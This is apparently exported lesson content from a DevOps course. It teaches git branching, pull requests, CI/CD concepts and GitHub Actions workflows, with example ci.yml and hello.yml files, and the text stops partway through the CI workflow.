sections.h: Git for teams: branches and the everyday loop
sections.body:
When you work alone, committing straight to `main` is fine. With a team it breaks fast. Two people edit the same file and one person's work disappears. Or `main` ends up with code that does not even start, and everyone who pulls it is stuck.

Branches fix this. A **branch** is a movable label that points at a commit. When you commit on your branch, your label moves forward and the `main` label stays where it was. Nothing on `main` changes until you merge. Creating a branch costs almost nothing: git writes one small file that holds a commit ID.

The everyday loop has four steps:

1. Create a branch from the latest `main`, for example `git switch -c add-pr-template`.
2. Change files and commit in small steps, each with a message that says why.
3. Push the branch to GitHub and open a pull request.
4. Merge it into `main` once it is reviewed and tested, then delete the branch.

Keep branches short. A branch that lives for an afternoon merges easily. A branch that lives for three weeks drifts away from `main`, and every day it gets harder to bring back.

sections.h: Merge, rebase and conflicts
sections.body:
While you work, `main` moves on. A teammate merged two pull requests this morning. Git gives you two ways to combine your branch with their work.

A merge joins the two lines of work with a new merge commit that has two parents. Your commits keep their IDs, and the history shows exactly what happened, side branch and all.

A rebase replays your commits on top of the newest `main`, as if you had started your branch today. The history becomes one straight line, but every replayed commit gets a new ID. So the rule is simple: rebase only branches that nobody else uses. After a rebase, push with `git push --force-with-lease`, which refuses to overwrite commits on GitHub that you have not seen.

Either way, git compares both sides with their merge base, the last commit they share. If only one side changed a part of a file, git takes that change. If both sides changed the same lines in different ways, git stops and asks you. That is a merge conflict. Git marks the clash in the file with `<<<<<<<`, `=======` and `>>>>>>>`. You edit the file until it says what it should, then `git add` it and commit. If you get lost, `git merge --abort` puts everything back.

One thing git never checks is whether the merged code still works. The worked example shows why that is the tests' job.

sections.h: Pull requests and code review
sections.body:
A pull request (PR) is a GitHub page that asks to merge your branch into `main`. It shows the diff (the lines you changed), a conversation, and the results of automatic checks. Teams use it for three separate things:

- Review: a teammate reads the change and comments on single lines.
- Checks: CI runs the tests and shows a green tick or a red cross.
- A record: a year later you can see why a line changed and who agreed.

Small pull requests get real reviews. A 40-line change tends to get careful comments, and a 2,000-line change tends to get a quick "looks good". Aim for something a reviewer can read in ten minutes. Open it early as a draft if you want feedback before it is finished. In the description, say what changed and how you tested it. The PR template you add today asks those questions for you.

When you review someone else's PR, read the description first, then the tests, then the code. Ask questions instead of giving orders: "what happens here if Redis is down?" Be kind to the person and strict about the code.

Two details surprise people. GitHub tests a pull request on a temporary merge of your branch into `main`, not on your branch alone. And while a PR has a merge conflict, its `pull_request` workflows do not run at all.

sections.h: Trunk-based development and GitFlow
sections.body:
Your team also has to agree how long branches live and where releases come from. That agreement is the branching strategy, and two styles are common.

In trunk-based development, everyone merges small branches into one main branch, the trunk, at least once a day. A branch lives for hours or a day or two, and `main` is always in a state you could release. Unfinished work is merged too, but switched off behind a feature flag: a setting that turns code on or off without a new deploy.

GitFlow uses several long-lived branches:

- `main` holds released code only.
- `develop` collects finished features.
- `feature/...` branches start from `develop`.
- `release/...` and `hotfix/...` branches prepare and patch releases.

GitFlow fits software that ships a big version a few times a year, or that must patch several old versions at once. If you deploy every week or more often, it gets in your way. Long-lived branches drift apart, and merging them back is slow and risky. For a web service like hello-devops I would pick trunk-based every time. This course uses [GitHub flow](https://docs.github.com/en/get-started/using-github/github-flow), GitHub's own simple version of it: branch, pull request, review, merge.

sections.h: CI, continuous delivery and continuous deployment
sections.body:
Continuous integration (CI) means everyone merges small changes often, and a server builds and tests every change automatically. You hear about a broken test minutes after you push, while you still remember what you changed. [Martin Fowler's article on continuous integration](https://martinfowler.com/articles/continuousIntegration.html) is the classic description and worth an evening.

CD has two meanings, and people mix them up:

- Continuous delivery: every change that passes is ready to release. A person decides when it goes to production, often with one click.
- Continuous deployment: every change that passes goes to production on its own. Nobody clicks anything.

The steps a change goes through form a pipeline. A typical one runs in this order:

1. Build: install dependencies and package the code.
2. Test: run linters and automated tests.
3. Publish: build a container image and push it to a registry.
4. Deploy: release that image to staging, then to production.

Build the image once, at the publish step. This rule is called **build once, deploy many**: the very same image, with the same digest from Day 12, moves from staging to production. If you rebuilt it for production, the build could pull newer packages, and what you ship would no longer be what you tested. Each step you automate here also moves the DORA metrics from Day 1, such as how often you deploy and how long a change takes to reach users.

sections.h: Deployment strategies: how a new version reaches users
sections.body:
Deploying means swapping the old version for the new one while users keep working. Four ways are common:

- Rolling: replace servers or containers a few at a time. Kubernetes does this by default (Day 32).
- Blue/green: run the new version (green) next to the old one (blue), then switch all traffic at once.
- Canary: send a small share of traffic, say 5%, to the new version, then grow it step by step.
- Feature flags: ship new code switched off, then turn it on for some users with a setting.

Each one has a cost. Rolling needs no extra servers, but for a few minutes old and new versions serve users side by side, so both must work with the same database. Blue/green gives you an instant rollback and costs double the capacity during the switch. A canary limits the damage of a bad release, as long as you have good metrics to judge it (Part 9 builds them). Feature flags need no deploy at all. You pay for them later, with `if` branches in the code that someone has to clean up.

On Kubernetes, [Argo Rollouts](https://github.com/argoproj/argo-rollouts) automates blue/green and canary releases. For hello-devops, the rolling update Kubernetes gives you for free is plenty.

sections.h: Semantic versions and git tags
sections.body:
A version number tells users how much changed. [Semantic versioning](https://github.com/semver/semver/blob/master/semver.md) uses three numbers, MAJOR.MINOR.PATCH:

- MAJOR goes up when you break compatibility, as in 2.0.0.
- MINOR goes up when you add a feature that stays compatible, as in 1.3.0.
- PATCH goes up for a compatible bug fix, as in 1.2.1.

A pre-release adds a label after a dash, as in `1.3.0-rc.1`, and counts as older than `1.3.0`.

A git tag is a name for one commit, such as `v1.2.0`. A branch label moves forward with each new commit, but a tag stays where you put it. Use annotated tags (`git tag -a`), which also store who made the tag, when, and a message.

In this course a tag is what starts a release. On Day 21, pushing the tag `v1.0.0` starts a workflow that builds and publishes the image `1.0.0`. The git tag, the image tag and the app's `version` field then all match. One catch: a plain `git push` does not send tags. Push each tag by name, as in `git push origin v1.0.0`.

lessons.analogy: A pull request works like a suggested edit in a shared document. You write on your own copy, a colleague reads the suggestion and comments, and the owner accepts it into the main text. CI is a spell checker that runs on every suggestion before anyone reads it. The picture breaks in one place: a document has one text, while git keeps many parallel copies and combines them line by line.

worked.title: Resolve a merge conflict, then catch what git missed

steps.say: Two branches changed the same line of `app.py`. On `main`, a teammate changed the default greeting to 'Hello, DevOps team!' and updated the test to match. On your branch `friendly`, you changed it to 'Hi there, DevOps!'. Git cannot keep both on its own, so the merge stops.
steps.code:
$ git switch main
$ git merge friendly
Auto-merging app.py
CONFLICT (content): Merge conflict in app.py
Automatic merge failed; fix conflicts and then commit the result.

steps.say: `git status --short` shows `UU`: both sides changed the file, and it is not merged yet. Find the clash with grep.
steps.code:
$ git status --short
UU app.py
$ grep -n -A4 "<<<<<<<" app.py
12:<<<<<<< HEAD
13-GREETING = os.getenv("GREETING", "Hello, DevOps team!")
14-=======
15-GREETING = os.getenv("GREETING", "Hi there, DevOps!")
16->>>>>>> friendly

steps.say: Above `=======` is the branch you are on (HEAD, here `main`). Below it is the branch coming in. You decide the result. Here you combine both ideas into one line and delete all three marker lines.
steps.code: GREETING = os.getenv("GREETING", "Hi there, DevOps team!")

steps.say: `git add` tells git the conflict is solved. Commit, and the graph shows the two lines of work joined by a merge commit with two parents.
steps.code:
$ git add app.py
$ git commit -m "Merge friendly: keep both ideas"
$ git log --oneline --graph
*   1a190aa Merge friendly: keep both ideas
|\
| * d301b30 Friendlier greeting
* | 1ab720f Greet the team
|/
* da23b48 Add greeting

steps.say: Run the tests before you push. Git only checked that the text merged cleanly. The teammate's test still expects 'Hello, DevOps team!', so it fails. You fix `test_app.py` and commit again. Breaks like this are exactly what CI catches on a pull request.

commands.what: Create a new branch from where you are and switch to it.
Push the branch to GitHub and remember the link, so later pushes need no names.
Open a pull request. `--fill` uses your commit message as the title and body.

lessons.mistake: The classic mistake is a big branch that lives for days and ends as one huge pull request. Reviewers can only skim it, conflicts pile up, and when a test fails you can't tell which change broke it. Make one small branch per change, open the PR early (as a draft if it is not ready), and merge within a day or two.
lessons.real_world: At PayLoop, a made-up payments company, every change to the checkout service goes through a pull request. The merge button turns on only after one approving review and green CI. Merges to `main` deploy to staging on their own, and the same image reaches production when an engineer clicks approve. That human click is what makes it continuous delivery.

task.title: Your first pull request with gh
steps: In `~/code/hello-devops`, switch to `main` and pull, so you start from the latest code.
Create a branch called `add-pr-template`.
Create `.github/pull_request_template.md` with the content from the Files section. Commit it with a message that says what it adds.
Push the branch and open a pull request with `gh pr create --fill`.
Open the PR in the browser. Read the Files changed tab the way a reviewer would, and leave a comment on one line.

Update your local `main`, then create the annotated tag `v0.1.0` and push it.

explain_back.prompt: Explain continuous integration, continuous delivery and continuous deployment to a teammate in 3 to 4 sentences. Say where a human decides.
explain_back.answer: Continuous integration means we all merge small changes often, and a server builds and tests each one, so we hear about a break within minutes. Continuous delivery carries every passing change through the rest of the pipeline, so it is packaged and ready to release, and a person decides when it goes to production. Continuous deployment drops that last human step, and every passing change goes live on its own. In both kinds of CD, the artifact is built once, and that same artifact moves through each stage.

recap: Work on short-lived branches and merge them through pull requests with review and checks.
A merge keeps history as it happened; a rebase makes a straight line with new commit IDs. Rebase only your own branches.
A merge conflict means two branches changed the same lines. You pick the result, and the tests tell you if it still works.
Trunk-based development keeps main releasable with small daily merges. GitFlow uses long-lived branches and suits rare, big releases.
CI tests every change. Continuous delivery keeps it ready to release; continuous deployment releases it with no human step.
Build once, deploy many: promote one tested image, and name releases with semantic versions and annotated tags.

check.q: Your team merges to main many times a day, and every passing change is ready to ship. A product manager clicks Release every Friday. What is this?
options: Continuous deployment
Continuous delivery
GitFlow
Blue/green deployment
check.why: Every change is ready to ship and a person picks the moment. That is continuous delivery.

check.q: You fix a bug in version 2.4.1, and nobody has to change how they call your API. What is the next version?
check.why: A compatible bug fix raises only the PATCH number.

check.q: You rebased your branch `add-metrics`, which only you use, onto the newest main. A plain `git push` is rejected. What do you do?
options: Push with git push --force-with-lease
Delete the repository and push again
Merge main into the branch a second time
Run git merge --abort
check.why: A rebase gives your commits new IDs, so GitHub sees different history. `--force-with-lease` replaces it, and refuses if someone else pushed in the meantime.

interview.q: What is the difference between continuous delivery and continuous deployment?
interview.a: Both build, test and package every change automatically, so main is always releasable. In continuous delivery, a person decides when a release goes to production, often with one click or an approval. In continuous deployment, every change that passes the pipeline goes to production with no human step. That only works with strong automated tests, good monitoring and fast rollback, because nobody looks at each release by hand.

interview.q: Why do many teams prefer trunk-based development to GitFlow?
interview.a: Trunk-based development keeps branches small and short-lived, so merges are easy and conflicts are rare. Main stays releasable, which fits CI and frequent deploys. In GitFlow, the long-lived develop and release branches drift apart, and merges get big and risky. GitFlow still fits products that ship versioned releases a few times a year, or that must patch several old versions.

interview.q: When would you rebase instead of merge?
interview.a: I rebase my own short-lived branch onto the newest main before I open or update a pull request. The history stays a straight line, and the PR shows only my changes. I never rebase a branch that someone else has pulled, because rebasing rewrites commit IDs and their copy no longer matches. After a rebase I push with --force-with-lease, which refuses to overwrite work I have not seen. For combining shared branches, I merge.

deeper.body:
Here is a puzzle. Pull request A renames the function `count_visit` to `record_visit` and updates every caller. Pull request B, opened the same morning, adds a new endpoint that calls `count_visit`. Both are green, because each was tested against that morning's `main`. A merges first. B merges second with no conflict, because the two PRs never touched the same lines. Now `main` is broken.

This is a semantic conflict: the text merges cleanly and the meaning does not. Git cannot see it, because git works on lines, not on what the code means. Only a test run on the real combination can catch it.

GitHub gives you two tools against it:

- Require branches to be up to date before merging. This is a ruleset setting (Day 19). B's checks must pass again on top of the newest `main` before it can merge. It is simple and safe, but on a busy repository people keep updating their branches and re-running CI.
- A merge queue. You press merge, and GitHub puts your PR in a queue. It builds a temporary branch with `main` plus the PRs ahead of yours, runs the required checks there, and merges only when they pass. Workflows must also listen to the `merge_group` event, or their required checks never report for the queue. Merge queues are available for repositories owned by an organization, so you will meet them at work rather than in your own account.

For a team of five, the up-to-date rule is usually enough. A merge queue pays off when many PRs land every hour. See [Managing a merge queue](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/configuring-pull-request-merges/managing-a-merge-queue).

While you are in the merge settings, pick one merge method for the repository:

- Create a merge commit: keeps every commit from the branch and adds a merge commit.
- Squash and merge: turns all the branch's commits into one new commit on `main`.
- Rebase and merge: replays each commit on top of `main`, with no merge commit.

Many trunk-based teams allow only squash. One PR becomes one commit on `main`, so `git log` stays readable and `git revert` undoes a whole PR in one step. The small commits are still visible on the PR page. See [About merge methods on GitHub](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/configuring-pull-request-merges/about-merge-methods-on-github).

On the GitHub server that stores your code

Something that starts a workflow, such as a push, a pull request or a timer.
One execution of a workflow, with its own logs and its own result.
A group of steps that runs on one runner; jobs run in parallel unless linked.

sections.h: What GitHub Actions is
sections.body:
You describe a task in a YAML file, and GitHub runs it when something happens in your repository. That is GitHub Actions, the automation built into GitHub. CI is its most common use. It can also publish releases, label issues or run a check every night.

The pieces fit inside each other. From the outside in:

1. An event happens, for example you push a commit.
2. GitHub finds every **workflow** that listens for that event and starts a run of each one.
3. A run starts one or more jobs. Jobs run in parallel unless one needs another.
4. Each job gets a runner, a machine that executes the job's steps in order.
5. Each step is a shell command or a ready-made action.

A step fails when its command ends with a non-zero exit code, the same exit codes you met in Part 1. The job stops there and is marked failed, and so is the run. `pytest` exits with 1 when a test fails, so one failing test turns the whole run red.

That is the whole trick behind CI. Tools exit non-zero when something is wrong, and a machine reads the exit code for you on every change.

sections.h: Anatomy of a workflow file
sections.body:
Workflows live in `.github/workflows/` at the root of your repository. GitHub treats every `.yml` or `.yaml` file there as a workflow. Get the folder name exactly right: a file in `.github/workflow/` (no s) is ignored without any warning. These top-level keys come up most:

- `name`: the label shown in the Actions tab.
- `on`: the events that start the workflow.
- `env`: environment variables for all jobs (optional).
- `jobs`: a map from job IDs, such as `test`, to job settings.

Inside a job, `runs-on` picks the runner and `steps` lists the work. Give each step a `name`, so the log is easy to read.

YAML trips most people up at first. These are the traps that bite in workflows:

- Indentation carries meaning. Use spaces, never tabs.
- A list item starts with a dash and a space.
- Versions need quotes: YAML reads `3.10` as the number 3.1, so write `"3.10"`.
- A plain value cannot contain a colon followed by a space. `run: echo "Result: ok"` is a YAML error.

I hit the last one while testing this lesson. The error says "mapping values are not allowed in this context" and points at the colon. Fix it with `run: |` and the command on the next line. The VS Code YAML extension from Day 2 and actionlint (Day 19) catch all four before you push.

sections.h: Events: when a workflow runs
sections.body:
The `on` key lists the events that start a workflow. You will use these four most:

- `push`: commits or tags are pushed. Filters such as `branches: [main]` or `tags: ["v*"]` narrow it down.
- `pull_request`: a PR is opened, gets new commits, or is reopened.
- `workflow_dispatch`: adds a Run workflow button to the Actions tab.
- `schedule`: runs on a timer written in cron syntax.

Filters also work on file paths. `paths: ["app.py"]` runs the workflow only when that file changed. Day 19 shows the trap that comes with path filters.

A `pull_request` run tests a temporary merge of your branch into the target branch, so it catches clashes with other people's work. The Run workflow button only appears once the workflow file is on the default branch.

Schedules have the most rules. They use UTC unless you set a time zone, and the shortest interval is every 5 minutes. They run only on the default branch, and they can start late when GitHub is busy, especially at the start of each hour. In a public repository, GitHub switches them off after 60 days without activity.

You can list several events at once. `on: [push, workflow_dispatch]` runs on every push and also gives you the button.

sections.h: Runners: the machines that run your jobs
sections.body:
Runners come in two kinds:

- GitHub-hosted: a fresh virtual machine for every job, deleted afterwards. It comes with git, Docker, Python, jq and many other tools.
- Self-hosted: a machine you run yourself and register with GitHub. It helps with special hardware or a private network, but patching and securing it is your job.

You pick a GitHub-hosted runner by its label in `runs-on`:

- `ubuntu-latest`: Linux on x64 (Intel or AMD) processors. Today it means Ubuntu 24.04. The label moves to newer versions over time, so write `ubuntu-24.04` when you need it fixed.
- `ubuntu-24.04-arm`: Linux on arm64, the same processor family as your Apple Silicon Mac.
- `windows-latest` and `macos-latest`: Windows, and macOS on Apple M1 machines.

In public repositories the standard Linux runners have 4 CPUs and 16 GB of memory. Private repositories get 2 CPUs and 8 GB.

Never attach a self-hosted runner to a public repository. Anyone can open a pull request, and a workflow could then run a stranger's code on your machine. GitHub's own docs recommend self-hosted runners only for private repositories. For this course, GitHub-hosted runners are all you need.

sections.h: Steps: uses versus run
sections.body:
A step does its work in one of two ways.

With `run:`, it executes shell commands. On Linux the default is bash with `-e`, so the script stops at the first failing command. For several commands, write `run: |` and put one command per line below it.

With `uses:`, it calls an action: packaged code that someone published, such as `actions/checkout@v7`. The part after `@` is the version, usually a git tag. You pass inputs to the action under `with:`, for example `python-version: "3.14"` for `actions/setup-python@v7`.

Each runner starts empty. Your code is not on it until a step puts it there, so nearly every job begins with `actions/checkout`, which copies your repository into the job's working folder. Forget it and the next step fails because `requirements-dev.txt` does not exist.

By default checkout fetches only the one commit the run is about, with no history and no other branches. That keeps it fast, and it is all a test run needs. A step that needs history, such as `git describe` or a changelog script, needs `fetch-depth: 0` under `with:`.

An action is other people's code running inside your job. Prefer actions from GitHub (`actions/...`) and from the tool's own company (`docker/...`), and look at an action's repository before you use it. Day 21 shows how to pin an action so its code cannot change under you.

sections.h: Environment variables, and reading runs and logs
sections.body:
Workflows pass settings with environment variables, set with `env` at three levels: the whole workflow, one job, or one step. The most specific level wins, so a step's value beats the job's value. GitHub also sets default variables in every step, such as `GITHUB_SHA` (the commit) and `GITHUB_REF_NAME` (the branch or tag). Copy values such as the branch name into `env` and use `"$BRANCH"` in scripts; Day 20 explains why that habit matters.

Every run shows up in your repository's Actions tab. Click a run to see a graph of its jobs, then click a job to see each step's log. A green tick means success, a red cross means failure, and a grey icon means skipped or cancelled. When a run fails, open the first red step and read its last lines. The error is usually there.

The `gh` CLI does the same from your terminal:

- `gh run list` shows recent runs and their status.
- `gh run watch` follows a run live until it finishes.
- `gh run view --log-failed` prints only the logs of failed steps.
- `gh run rerun --failed --debug` runs the failed jobs again with extra detail.

To get the extra detail on every run, set the repository variable `ACTIONS_STEP_DEBUG` to `true`. Anyone who can read the repository can read its logs, so never print a secret, not even for a quick test.

sections.h: What it costs, and the limits
sections.body:
Standard GitHub-hosted runners are free in public repositories, with no minute limit. Private repositories draw from a monthly allowance that GitHub now counts in dollars. At the time of writing:

- The Free plan includes $12 of compute a month for private repositories.
- A Linux x64 minute costs $0.006, so $12 buys about 2,000 minutes.
- Linux arm64 is a little cheaper ($0.005 a minute), and macOS is about ten times dearer ($0.062).
- Usage is charged to the repository owner, not to the person who pushed.

Check the [current billing page](https://docs.github.com/en/billing/concepts/product-billing/github-actions) before you rely on these numbers. My advice for this course: keep `hello-devops` public (it holds no secrets), and every run is free.

The limits worth knowing:

- A job may run for at most 6 hours. Set `timeout-minutes` much lower, because a hung job otherwise waits the full 360 minutes.
- The Free plan runs up to 20 jobs at the same time, at most 5 of them on macOS.
- Logs and artifacts are kept for 90 days by default.

lessons.analogy: A workflow is like an order ticket in a restaurant kitchen. When the dish is done, the station is wiped for the next order. The kitchen picture fails on leftovers: a kitchen keeps them, and a runner keeps nothing unless you save it as a cache or an artifact (Day 19).

code.title: .github/workflows/hello.yml (practice, deleted at the end)
code.src:
name: hello

# Run on every push to any branch, and from a button in the Actions tab.
on:
  push:
  workflow_dispatch:

# Workflow-level env: every job and step can read it.
env:
  GREETING: Hello from GitHub Actions

jobs:
  say-hello:
    runs-on: ubuntu-latest
    # Job-level env: only steps in this job can read it.
    env:
      JOB_NOTE: I run on a fresh virtual machine
    steps:
      - name: Print facts about this run
        # Step-level env: copy context values into plain shell variables.
        env:
          BRANCH: ${{ github.ref_name }}
          EVENT: ${{ github.event_name }}
        run: |
          echo "$GREETING"
          echo "$JOB_NOTE"
          echo "Commit: ${{ github.sha }}"
          echo "Branch or tag: $BRANCH"
          echo "Started by: $EVENT"
      - name: Look around the runner
        run: |
          uname -sm
          python3 --version
          docker --version

  # A second job. It runs at the same time, on an arm64 machine like your Mac.
  on-arm:
    runs-on: ubuntu-24.04-arm
    steps:
      - name: Which CPU is this?
        run: uname -sm

interview.q: What is the difference between a job and a step in GitHub Actions?
interview.a: A job is a group of steps that runs on one runner. The steps in a job run in order and share the same machine and files. Different jobs run on different runners, in parallel by default, and share nothing unless you pass artifacts or outputs. You use `needs` to make one job wait for another.

interview.q: When would you choose self-hosted runners over GitHub-hosted ones?
interview.a: GitHub-hosted runners are fresh, patched virtual machines that you do not maintain, and they are free for public repos. Self-hosted runners make sense when you need special hardware, access to a private network, or lower cost at very high volume. In exchange, you patch, scale and secure them yourself. GitHub recommends self-hosted runners only for private repositories, because a pull request from a fork could run code on your machine.

deeper.body:
A `run:` step looks like a list of commands, but GitHub saves it as a script file and runs that file with a shell. The shell and its options decide how failures behave.

On Linux runners, if you do not set `shell`, GitHub runs `bash -e {0}`, where `{0}` is the script file. The `-e` flag is the `set -e` from Part 1: the script stops at the first command that fails, and the step fails with that exit code.

If you write `shell: bash` yourself, GitHub runs `bash --noprofile --norc -eo pipefail {0}` instead. The extra `pipefail` changes how pipes fail. Without it, a pipe returns the exit code of its last command. So `pytest -q | tee test.log` passes even when tests fail, because `tee` worked fine. With `pipefail`, the failing `pytest` fails the whole pipe, and the step goes red.

To set the shell once for every step, add a `defaults` block at the top of the workflow with `run: shell: bash` inside it. Many teams do this to get `pipefail` everywhere, and I would too.

Some more facts that save debugging time:

- Each `run:` step starts a new shell. A variable you `export` in one step is gone in the next one.
- To hand a value to later steps, append a line like `NAME=value` to the file named in `$GITHUB_ENV` (Day 20 covers this properly).
- All steps in a job share one disk, so a file written in step 2 is still there in step 3.
- `working-directory: app` runs a step inside a subfolder.
- `continue-on-error: true` lets a step fail without failing the job. Use it rarely, because it hides problems.

One more oddity, for when you parse workflow files with your own scripts. Python's PyYAML follows an old YAML rule and reads the key `on` as the boolean `true`. GitHub's own parser does not, so your workflow is fine; your script just has to look for `True` instead of `"on"`.

The supported shells table in the [workflow syntax reference](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax) lists the exact command line for each shell. If a script works on your laptop and fails in CI, check these flags early.

lessons.goal: By the end you can build a CI pipeline that lints, tests on two Python versions, keeps a test report and checks the Docker build, runs fast with caches, and blocks red pull requests from merging.

sections.h: What a good pipeline does, and in what order
sections.body:
Today you grow the Day 18 `ci.yml` into a real pipeline. Right now it runs the tests once. A real pipeline checks more, and it has to be quick, because people wait for it before they merge. So cheap checks go first and slow ones last.

The lab's pipeline has three jobs:

1. `lint`: ruff checks style and likely bugs. It takes seconds.
2. `test`: pytest, once for each Python version you support.
3. `build`: builds the Docker image. It is the slowest, so it waits for the other two.

Jobs run in parallel by default, so `lint` and both `test` jobs start at the same moment on separate runners. The `needs` key makes a job wait: with `needs: [lint, test]`, `build` starts only after all of them succeed. If one fails, `build` is skipped, and you get the bad news without paying for the slow part.

The triggers change too. CI now runs on pull requests, which test the merged result, and on pushes to `main`. It no longer runs on pushes to every branch, because then each commit on a PR branch would be tested twice. One more line, `permissions: contents: read`, makes the job's token read-only. Day 21 explains why that matters.

sections.h: Lint, tests and a test report
sections.body:
A linter reads your code without running it and flags problems such as unused imports or undefined names. This course uses ruff, which does both linting and formatting:

- `ruff check .` finds lint problems, and `ruff check --fix .` fixes the safe ones.
- `ruff format --check .` fails if a file is not formatted, and `ruff format .` formats it.

Both exit with code 1 when they find a problem, so they fail the step the same way `pytest` does.

Next comes a test report. `pytest --junitxml=reports/junit.xml` also writes the results as JUnit XML, a format most CI tools can read. The runner is deleted after the job, so you keep the report as an artifact. That is a file a job uploads and you download later, from the run page or with `gh run download`. Artifacts stay 90 days by default. The lab keeps test reports for 7.

Since version 4, `actions/upload-artifact` has two rules worth knowing. An artifact cannot be changed after upload, and names must be unique within a run. Two matrix jobs that both upload `junit` would clash, so the lab puts the Python version in the name. The upload step also has `if: ${{ !cancelled() }}`. Normally GitHub skips every step after one fails; this condition still uploads the report after a test failure, which is when you need it most. Day 20 explains these conditions properly.

sections.h: Caching, and how cache keys work
sections.body:
Every job starts on an empty machine, so `pip install` downloads every package again on every run. A cache saves files from one run and restores them in the next. Each entry is stored under a cache key: a string that describes what is inside, so a job can tell whether the saved files still fit.

`actions/setup-python` has pip caching built in: set `cache: pip`. The key it builds is made of the runner's OS and CPU, the Python version and a hash of your requirements files. It looks roughly like `setup-python-Linux-x64-24.04-Ubuntu-python-3.14.<patch>-pip-<hash>`. `cache-dependency-path: requirements*.txt` says which files to hash, so changing either file gives a new key.

When the job starts, one of three things happens:

- Exact hit: a cache with the same key exists. The log says "Cache restored from key".
- Partial hit: no exact match, but a key with the same start (same OS and Python, older hash). Those older files are restored, and pip downloads only what changed.
- Miss: the log says "pip cache is not found", and pip downloads everything.

A job that missed saves a new entry when it finishes. Scope matters here. A run can restore caches from its own branch and from `main`, but a cache saved by a pull request stays with that pull request. That is one reason CI also runs on pushes to `main`: it keeps a fresh cache that every new PR starts from. GitHub deletes caches nobody used for 7 days and keeps at most 10 GB per repository. Treat the cache as a speed-up that can vanish, and never put secrets in a cached folder.

sections.h: A matrix: one job, many versions
sections.body:
A matrix runs one job definition several times with different values. Your app should work on Python 3.13 and 3.14, so:

- `strategy: matrix: python-version: ["3.13", "3.14"]` creates two jobs from one definition.
- `${{ matrix.python-version }}` passes each value to setup-python and into the artifact name.
- `fail-fast: false` lets both finish even if one fails. The default cancels the others at the first failure, which hides whether a bug only affects one version.

The two jobs run at the same time, so the matrix adds almost no waiting. They show up as two checks, `test (3.13)` and `test (3.14)`. Remember those exact names, because the ruleset needs them later today.

A matrix can have several dimensions. Add `os: [ubuntu-latest, ubuntu-24.04-arm]` next to the Python list and you get four jobs, one per combination. `include` adds one extra combination and `exclude` removes one. A single matrix can create at most 256 jobs. For hello-devops, two is right: every extra job costs runner time and adds one more check to keep green.

sections.h: Check that the image builds
sections.body:
Your Dockerfile is code too, and it can break. A wrong `COPY` path, or a package that no longer installs, only shows up when you build. So CI builds the image for every change, without pushing it anywhere.

The `build` job uses Docker's own actions:

- `docker/setup-buildx-action` starts a BuildKit builder, the build engine from Part 3.
- `docker/build-push-action` builds the image; with `push: false` it only builds.
- `cache-from: type=gha` and `cache-to: type=gha,mode=max` keep image layers in the Actions cache.

The layer cache works like the one on your laptop from Day 13. If `requirements.txt` did not change, the `pip install` layer comes back from the cache and the build takes seconds. With `mode=max`, the cache also keeps the layers of the build stage of your multi-stage Dockerfile, not only the final image.

Since June 2026, runs started by untrusted triggers, such as `pull_request_target` and `issue_comment`, may read the default branch's cache but not write to it. Docker's docs say to keep `cache-from` and drop `cache-to` in such workflows. Your `pull_request` workflow is not affected, because its cache never reaches `main` anyway. On Day 21, a second workflow uses the same actions with `push: true`.

sections.h: Stop broken code from merging
sections.body:
CI only protects you if a red result stops the merge. On GitHub you get that with a **ruleset** on `main`: a named list of rules for branches or tags. The older feature, branch protection rules, still works. Rulesets are more flexible, since several can apply at once, and anyone with read access can see them.

For `main`, start with these rules:

- Require a pull request before merging, so nobody pushes to `main` directly.
- Require status checks to pass: `lint`, `test (3.13)`, `test (3.14)` and `build`.
- Block force pushes, which is on by default.

Most people get caught by at least one of these details:

- On the Free plan, rulesets are only enforced on public repositories.
- A new ruleset starts as Disabled. Set its enforcement status to Active.
- A check only shows up in the ruleset's search after it has run successfully in the repository during the last seven days.
- A job skipped because its `needs` failed counts as passed. That is why you require the lint and test checks too, and not only `build`.

You work alone, so leave required approvals at zero. GitHub does not let you approve your own pull request.

sections.h: Keep CI fast and cheap
sections.body:
Slow CI changes how people work. They stop waiting for it, or they bundle many changes into one big PR. These settings keep it quick:

- `concurrency` with `cancel-in-progress` cancels a stale run when you push again to the same branch or PR.
- `timeout-minutes` stops a hung job early, instead of after the default 360 minutes.
- `paths-ignore` on `push` skips runs when a push only changes Markdown files.
- The pip and Docker layer caches keep installs and builds short.

On `main` the lab lets every run finish, so each merge gets a full result. And never put path filters on `pull_request` when its checks are required. A workflow skipped by a filter never reports, so its checks stay Pending and block the merge.

For deploys, cancelling is the wrong move. By default a concurrency group holds one running and one waiting run. A newer waiting run replaces the older one. `queue: max` lets up to 100 runs wait in line instead. The Terraform workflow on Day 29 uses a group that never cancels.

Two tools help before you push. The linter [actionlint](https://github.com/rhysd/actionlint) checks workflow files for mistakes such as typos in keys, bad expressions and unsafe use of untrusted input. And [act](https://github.com/nektos/act) runs workflows on your laptop in Docker containers. It is handy for quick tries, but it does not match GitHub's runners exactly, so the real test is still a push.

steps.say: A teammate's PR adds `import json` to `app.py` but never uses it. The `lint` check turns red, both test checks pass, and `build` is skipped. You read the failure from the terminal.

code.title: .github/workflows/ci.yml (Day 19 version)
code.src:
name: ci

on:
  push:
    branches: [main]
    # Skip CI on main when a push only changes Markdown files.
    # Never filter pull_request like this: a required check that never runs
    # stays "Pending" and blocks the merge.
    paths-ignore:
      - "**.md"
  pull_request:
  workflow_dispatch:

# One run per branch or pull request. A new push cancels the older run,
# except on main, where every merge gets a full result.
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}

# The GITHUB_TOKEN in this workflow can only read the repository.
permissions:
  contents: read

jobs:
  lint:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-python@v7
        with:
          python-version: "3.14"
          cache: pip
          cache-dependency-path: requirements*.txt
      - name: Install dependencies
        run: pip install -r requirements-dev.txt
      - name: Lint and format check
        run: ruff check . && ruff format --check .

  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    strategy:
      # Let every Python version finish, so you see all failures at once.
      fail-fast: false
      matrix:
        python-version: ["3.13", "3.14"]
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-python@v7
        with:
          python-version: ${{ matrix.python-version }}
          cache: pip
          cache-dependency-path: requirements*.txt
      - name: Install dependencies
        run: pip install -r requirements-dev.txt
      - name: Run tests
        run: pytest -q --junitxml=reports/junit.xml
      - name: Upload test report
